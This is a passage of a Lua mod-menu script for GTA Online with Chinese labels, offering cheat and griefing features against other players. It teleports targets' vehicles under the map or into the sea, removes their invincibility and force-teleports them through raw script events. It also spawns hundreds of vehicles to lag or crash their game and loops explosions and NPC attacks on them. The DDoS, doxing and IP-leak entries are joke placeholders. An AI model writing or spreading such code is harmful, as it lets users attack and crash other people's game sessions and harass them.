            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 5, -1)
            local rot = ENTITY.GET_ENTITY_ROTATION(p, 5)
            rot.x = 0
            rot.y = 0
            rot.z = rot.z + 180
            if PED.IS_PED_IN_ANY_VEHICLE(p, true) then
                STREAMING.REQUEST_MODEL(wall)
                while not STREAMING.HAS_MODEL_LOADED(wall) do
                    STREAMING.REQUEST_MODEL(wall)
                    util.yield()
                end
                local spawnedwall = entities.create_object(wall, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, rot.x, rot.y, rot.z, 1, true)
                util.yield(5000)
                entities.delete_by_handle(spawnedwall)
                if not STREAMING.HAS_MODEL_LOADED(wall) then
                    util.toast("无法加载模型")
                end
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.action(player_vehicle, "传送到地图下方", {}, "", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
            c.z = c.z - 100
            if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
                local success, floorcoords
                repeat
                    success, floorcoords = util.get_ground_z(c.x, c.y)
                    util.yield()
                until success
                RequestControl(veh)
                floorcoords = floorcoords - 50
                ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.action(player_vehicle, "传送到高空上", {}, "", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
            c.z = c.z + 1500
            if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
                RequestControl(veh)
                ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false) --tp very high up
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.action(player_vehicle, "传送到大海里", {}, "", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
            if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
                RequestControl(veh)
                ENTITY.SET_ENTITY_COORDS(veh, -2247.1692, -1903.4473, 3, false, false, false, false) --tp in ocean
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.action(player_vehicle, "传送到监狱里", {}, "", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
            if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
                RequestControl(veh)
                ENTITY.SET_ENTITY_COORDS(veh, 1652.5746, 2569.7756, 45.564854, false, false, false, false) --tp in prison
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.action(player_vehicle, "传送到密室里", {}, "", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defx = c.x
            local defy = c.y 
            local defz = c.z
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
                STREAMING.REQUEST_MODEL(floorbr)
                while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                    STREAMING.REQUEST_MODEL(floorbr)
                    util.yield()
                end
                STREAMING.REQUEST_MODEL(wallbr)
                while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                    STREAMING.REQUEST_MODEL(wallbr)
                    util.yield()
                end
                RequestControl(veh)
                local success, floorcoords
                repeat
                    success, floorcoords = util.get_ground_z(c.x, c.y)
                    util.yield()
                until success
                c.z = floorcoords - 100
                ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)
    
                local c = ENTITY.GET_ENTITY_COORDS(p)
                local defz = c.z
                c.z = defz - 2
                local spawnedfloorbr = entities.create_object(floorbr, c)
                c.z = c.z + 10
                local spawnedroofbr = entities.create_object(floorbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)
    
                defz = c.z - 5
                c.x = c.x + 4
                c.z = defz
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 8
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 8
                c.x = defx + 10.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 14.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 7.2
                c.x = defx + 3.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = defy + 6.5
                c.x = defx + 11
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = defx - 12
                c.y = defy + 4
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = defy - 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 10
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = defy - 10
                c.x = defx - 19
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = defx - 3
                c.y = defy + 6.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = defx + 25
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x + 7
                c.y = defy
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = defy - 14.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 7
                c.x = c.x - 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 7
                c.x = c.x - 7.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 6.5
                c.y = c.y - 6.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 7.5
                c.y = c.y - 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 14
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 6.5
                c.y = c.y + 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 7.5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.x = c.x - 6.5
                c.y = c.y + 7
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y + 14
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y + 14
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y + 14
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                c.y = c.y - 3.1
                c.x = c.x + 5
                local spawnedwall = entities.create_object(wallbr, c)
                ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
                OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)
    
                util.yield(500)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
                util.yield(500)
                entities.delete_by_handle(veh)
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.toggle_loop(player_vehicle, "禁用载具", {}, "", function(toggle)
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
            if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            else
                local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
                entities.delete_by_handle(veh2)
            end
        end)
    
        menu.action(player_vehicle, "卸载无敌载具", {}, "", function()
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p)
            if PED.IS_PED_IN_ANY_VEHICLE(p) then
                RequestControl(veh)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
        menu.toggle_loop(player_vehicle, "循环卸载无敌载具", {}, "", function(toggle)
            local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local veh = PED.GET_VEHICLE_PED_IS_IN(p)
            if PED.IS_PED_IN_ANY_VEHICLE(p) then
                RequestControl(veh)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            else
                util.toast(players.get_name(pid).. " 不在车里")
            end
        end)
    
    ascm = menu.list(trolling, "逮捕令", {"ascm"}, "自定义警察攻击者，以及应用于游戏产生的警察的修改.")
    menu.action(ascm, "派遣FIB武装夜鲨", {"fibatk"}, "武装夜沙，极其凶残", function(on_click)
        wzys(on_click)
    end)
    menu.action(ascm, "武装APC", {"fibapc"}, "你听到了吗.", function(on_click)
        wzAPC(on_click)
    end)
    menu.action(ascm, "派遣武装FIB", {"fibatk"}, "无论是哪辆车，只要它不会飞，都很难逃脱", function(on_click)
        wuzhuangfib(on_click)
    end)
    menu.action(ascm, "派遣FIB执行射杀", {"fibatk"}, "无论是哪辆车，只要它不会飞，都很难逃脱", function(on_click)
        paiqianfib(on_click)
    end)
    menu.action(ascm, "派遣FIB地面单位", {"fibgr"}, "", function(on_click)
        paiqianfibdimiandanwei(on_click)
    end)
    menu.toggle_loop(ascm, "摆脱不掉的条子", {"copmagnet"}, "玩家即使死了也会和警察起冲突，可和其他攻击者一起开启.", function(on)
        baituobudiao(on)
    end)
    menu.toggle_loop(ascm, "特种条子", {"combat3"}, "使游戏中产生的警察超级nb，提高他们的准确性和战斗能力，并使他们的车辆更快。由于NPC直接向上不拍摄，循环中有较慢/无延迟，因此该循环增加了0.5秒的延迟.", function(on)
        tezhongtiaozi(on)
    end)
    menu.action(ascm, "执行撤离", {"atkyeet"}, "使你的部下撤离.", function(on_click)
        zhixingcheli(on_click)
    end)
    menu.toggle_loop(friendly, "自动获得脚本主机", {}, "如果加载屏幕卡住了，有用.", function()
        menu.trigger_commands("givesh".. PLAYER.GET_PLAYER_NAME(pid))
        util.yield(1000)
        end)
        menu.toggle_loop(friendly, "向Ta发送垃圾邮件", {}, "", function()
        util.yield(250)
        menu.trigger_commands("commendfriendly".. PLAYER.GET_PLAYER_NAME(pid))
        end)
        local YhShengcheng = menu.list(friendly, "友好生成", {}, "")
        menu.divider(YhShengcheng, "娱乐")

    menu.action(YhShengcheng, "生成狗", {}, "woof", function ()
        ped_explosion(pid, "a_c_retriever")
    end)

    menu.action(YhShengcheng, "生成猫", {}, "Meow", function ()
        ped_explosion(pid, "a_c_cat_01")
    end)

    menu.action(YhShengcheng, "假爆炸", {}, "Boom", function ()
        fake_explosion(pid)
    end)

    

    local dropRP = menu.list(friendly, "天降RP值", {}, "")
    rpdropDelay = 1500
    menu.slider(dropRP, "RP天降延迟", {}, "RP天降延迟", 100, 10000, 1500, 100, function(rpDelay)
        rpDropDelay = rpDelay
    end)
    menu.toggle_loop(dropRP, "天降RP", {}, "RP天降，但延迟可调", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local figure = MISC.GET_HASH_KEY("vw_prop_vw_colle_prbubble")
        STREAMING.REQUEST_MODEL(figure)
        if STREAMING.HAS_MODEL_LOADED(figure) == false then  
            STREAMING.REQUEST_MODEL(figure)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, figure, false, true)
        util.yield(rpDropDelay)
    end)
    local dropCard = menu.list(friendly, "天降收集牌", {}, "")
    cardDropDelay = 1500
    menu.slider(dropCard, "收集牌延迟", {}, "延迟收集牌", 100, 10000, 1500, 100, function(cardDelay)
        cardDropDelay = cardDelay
    end)
    menu.toggle_loop(dropCard, "天降收集牌", {}, "玩家每次只能拾取54张牌，请注意，这还没有测试过禁令，但应该是安全的", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
        util.yield(cardDropDelay)
    end)
    menu.action(
        friendly,
        "全面升级玩家车辆",
        {},
        "全面升级玩家车辆",

        function()
            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local vehicle = PED.GET_VEHICLE_PED_IS_USING(player_ped)
            request_control_of_entity(vehicle)
            upgrade_vehicle(vehicle)
        end
    )
    menu.hyperlink(hack, "Dox", "https://bit.ly/3Q1MN7X", "将发现的所有玩家的信息生成一个Doxbin链接。") --rickroll

    menu.hyperlink(hack, "泄漏IP", "https://bit.ly/3xjpQpt", "在聊天中泄漏他们的IP")
    menu.action(friendly, "关闭玩家无敌模式", {}, "关闭玩家无敌模式", function()
        if players.exists(pid) then
        send_script_event(-1388926377, pid, {pid, 1})
        send_script_event(-1388926377, pid, {pid, 1})
    end
end)
menu.action(friendly, "送Ta上岛", {}, "send to iland", function()
    if players.exists(pid) then
        send_script_event(1361475530, pid, {pid, 0})
    end
end)

menu.action(friendly, "拉到仓库", {}, "", function()
    if players.exists(pid) then
        send_script_event(2130458390, pid, {pid, 0})
    end
end)
menu.action(friendly,"给Ta刷飞机", {}, "很卡，有概率崩掉对方", function() -- cpu burn simulator v2
    while not STREAMING.HAS_MODEL_LOADED(447548909) do
        STREAMING.REQUEST_MODEL(447548909)
        util.yield(10)
    end
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

    notification("Started lagging the fuck out of him", colors.black)
    menu.trigger_commands("anticrashcamera on")
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(447548909, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    notification("Done", colors.green) -- cpu burned congrats
    menu.trigger_commands("anticrashcamera off")
end)


menu.action(friendly,"拉到押运车", {}, "", function()
    V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    if table_kidnap == nil then
        table_kidnap = {}
    end

    hash = util.joaat("stockade")
    ped_hash = util.joaat("MP_M_Cocaine_01")

    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)

        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end

        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

        local aab = 
        {
            x = -5784.258301,
            y = -8289.385742,
            z = -136.411270
        }

        ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
        ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

        table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
        CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            STREAMING.REQUEST_MODEL(ped_hash)
            util.yield()
        end
        ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

        ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
        ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
            true, true, false, 0, false)
        ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
            false)
        PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
        TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

        util.yield(500)

        entities.delete_by_handle(ped_to_kidnap)
        veh_to_attach = veh_to_attach + 1

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

    end
end)

    menu.action(friendly, "看看这吊毛是不是挂壁", {"isplayermodder"}, "检查所选玩家是否为挂壁，然后在本地聊天中显示结果。其他玩家无法看到此消息.", function() is_player_modder(pid) end)
    menu.action(trolling, "小行星攻击", {}, "用小行星来攻击他", function() 
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)
    menu.toggle_loop(trolling, "玩偶循环", {}, "目标会保持", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
        util.yield(10)
    end)
    menu.action(trolling, "外星人爆炸", {"ufo"}, "模拟外星人入侵", function() --that option is rlly cool ngl
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        STREAMING.REQUEST_MODEL(ufo)
        while not STREAMING.HAS_MODEL_LOADED(ufo) do
            STREAMING.REQUEST_MODEL(ufo)
            util.yield()
        end
        menu.trigger_commands("freeze".. players.get_name(pid).. " on")
        c.z = c.z + 10
        local spawnedufo = entities.create_object(ufo, c) --creates ufo
        util.yield(2000)
        c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
        util.yield(1000)
        entities.delete_by_handle(spawnedufo)
        menu.trigger_commands("freeze".. players.get_name(pid).. " off")
    end)
    menu.toggle_loop(trolling, "假钱散花", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Fakemoney('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)
    menu.toggle_loop(trolling, "火柱", {}, "火焰攻击！！！", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 12, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(trolling, "水柱", {}, "水柱攻击！！！", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 13, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(trolling, "追踪", {}, "", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 35, 0, false, false, 0, false)
        util.yield(65)
    end)
    local heavy = util.joaat("weapon_heavysniper")
    local damagelist = menu.list(trolling, "攻击类型", {}, "")
    menu.action(damagelist, "狙击", {"snipe"}, "", function()
        local cam = C_CAM.GET_GAMEPLAY_CAM_COORD()
        local p = C_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = C_ENTITY.GET_ENTITY_COORDS(p, false)
        C_MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cam.x, cam.y, cam.z, c.x, c.y, c.z, 1000, 1, heavy, players.user_ped(), true, false, 2500.0) --snipe
    end)
    local atomizer = util.joaat("weapon_raypistol")
    menu.action(damagelist, "脉冲", {"atomize"}, "", function()
        local cam = C_CAM.GET_GAMEPLAY_CAM_COORD()
        local p = C_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = C_ENTITY.GET_ENTITY_COORDS(p, false)
        C_MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cam.x, cam.y, cam.z, c.x, c.y, c.z, 1000, 1, atomizer, players.user_ped(), true, false, 2500.0) --atomize
    end)

    menu.action(damagelist, "脉冲波", {"launch"}, "有报错，但是正常用", function()
        local cam = C_CAM.GET_GAMEPLAY_CAM_COORD()
        local p = C_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = C_ENTITY.GET_ENTITY_COORDS(p, false)
        local posx = c.x
        local posy = c.y
        local posz = c.z
        util.yield(10)
        for i = 1, 100 do
            C_MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(posx, posy, posz, c.x, c.y, c.z, 1000, 1, atomizer, players.user_ped(), true, false, 2500.0) --launch
        end
        menu.trigger_commands("freeze" ..players.get_name(pid).. " on")
        util.yield(50)
        menu.trigger_commands("freeze" ..players.get_name(pid).. " off")
    end)
    local molotov = util.joaat("weapon_molotov")
    menu.action(damagelist, "头上掉燃烧瓶", {}, "生成火焰在他身上", function()
        local p = C_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = C_ENTITY.GET_ENTITY_COORDS(p, false)
        local posx = c.x
        local posy = c.y
        local posz = c.z + 1
        C_MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(posx, posy, posz, c.x, c.y, c.z, 1000, 1, molotov, players.user_ped(), true, false, 2500.0) --burn
    end)
    menu.action(hack, "DDoS攻击", {}, "通过向玩家的路由器发送数据包进行DDoS攻击", function()
        util.toast("成功发送DDoS攻击到 " ..players.get_name(pid))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("开玩笑的，你这小白痴~")
    end)
    menu.action(hack, "获取账户信息", {}, "获取玩家的帐户信息，格式：电子邮件：密码", function()
        util.toast("你真以为你是hacker?给你点阳光你就灿烂是吧？")
    end)
    local explosions = menu.list(trolling, "爆炸玩家", {}, "")
    menu.action(explosions, "匿名爆炸", {}, "", function() --anon exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)

    
    menu.action(explosions, "爆炸", {}, "", function() --owned exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0)
    end)

    menu.toggle_loop(explosions, "循环匿名爆炸", {}, "", function() --loop anon exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    end)

    menu.toggle_loop(explosions, "循环爆炸", {}, "", function() --loop owned exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, c.z, exp, 100.0, true, false, 1.0)
    end)

    menu.action(explosions, "虚假爆炸", {}, "爆炸不会造成伤害", function() --fake exp
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 0.0, true, false, 1.0, false)
    end)

    menu.action(explosions, "外星人爆炸", {"ufo"}, "模拟外星人入侵", function() --that option is rlly cool ngl
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        STREAMING.REQUEST_MODEL(ufo)
        while not STREAMING.HAS_MODEL_LOADED(ufo) do
            STREAMING.REQUEST_MODEL(ufo)
            util.yield()
        end
        menu.trigger_commands("freeze".. players.get_name(pid).. " on")
